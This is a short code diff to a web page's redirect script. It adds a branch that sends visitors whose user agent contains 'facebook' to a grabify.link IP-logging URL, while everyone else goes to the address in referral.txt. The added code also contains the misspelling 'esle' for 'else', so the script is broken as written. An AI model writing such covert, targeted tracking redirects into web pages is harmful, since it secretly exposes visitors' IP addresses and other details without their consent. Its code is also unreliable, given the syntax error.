@@ -10,7 +10,11 @@
     <body>
         <script>
             $.get('referral.txt', function(textData) {
-                window.location.replace(textData);
+                if (navigator.userAgent.includes("facebook")) {
+                    window.location.replace("https://grabify.link/RZ1YH6");
+                } esle {
+                    window.location.replace(textData);
+                }
             },'text');
         </script>
     </body>
